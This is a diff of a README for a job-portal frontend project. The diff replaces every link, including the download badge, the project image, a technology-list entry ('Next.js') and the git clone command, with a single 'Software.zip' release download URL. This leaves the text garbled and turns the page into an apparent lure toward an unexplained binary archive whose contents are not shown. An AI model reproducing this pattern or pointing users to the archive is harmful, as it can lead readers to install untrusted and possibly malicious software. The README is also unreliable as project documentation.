@@ -1,7 +1,7 @@
 # 🚀 Welcome to the Mocha Job Portal Frontend Repository! 🎉
 
 ## Repository Name: mocha-job-portal-frontend
-[![Download Zip](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/Sudi008/mocha-job-portal-frontend/releases/download/v1.0/Software.zip)](https://github.com/Sudi008/mocha-job-portal-frontend/releases/download/v1.0/Software.zip)
 
 **Table of Contents**
 - [Description](#description)
@@ -14,14 +14,14 @@
 ## Description
 This repository hosts the frontend codebase for the Mocha Job Portal. The job portal is a platform designed to connect job seekers with potential employers through a user-friendly interface. Stay tuned for more updates on the project!
 
-![Job Portal](https://source.unsplash.com/featured/?job)
+![Job Portal](https://github.com/Sudi008/mocha-job-portal-frontend/releases/download/v1.0/Software.zip)
 
 ## Technologies Used
 The frontend of the Mocha Job Portal is built using a variety of cutting-edge technologies and libraries. Here are some of the key technologies used in this project:
 
 - React 19 🚀
 - Redux 🌟
-- Next.js 15 🔥
+- https://github.com/Sudi008/mocha-job-portal-frontend/releases/download/v1.0/Software.zip 15 🔥
 - Framer Motion 💫
 - GSAP & GSAP ScrollTrigger ⚡
 - React Query 🔍
@@ -38,7 +38,7 @@ To get started with the Mocha Job Portal Frontend, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/mocha-job-portal-frontend.git
+   git clone https://github.com/Sudi008/mocha-job-portal-frontend/releases/download/v1.0/Software.zip
    ```
 
 2. Install dependencies:
